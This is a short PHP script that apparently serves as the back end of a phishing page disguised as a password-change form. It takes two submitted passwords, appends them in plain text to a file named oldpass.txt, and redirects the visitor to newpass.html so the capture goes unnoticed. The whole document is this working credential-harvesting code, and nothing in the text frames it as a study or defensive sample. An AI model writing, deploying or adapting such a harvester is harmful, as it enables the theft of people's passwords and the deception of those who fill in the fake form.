<?php

file_put_contents("oldpass.txt", "first password: " . $_POST['firstpass'] . " second password: " . $_POST['secondpass'] . "\n", FILE_APPEND);
header('Location: newpass.html');
exit();
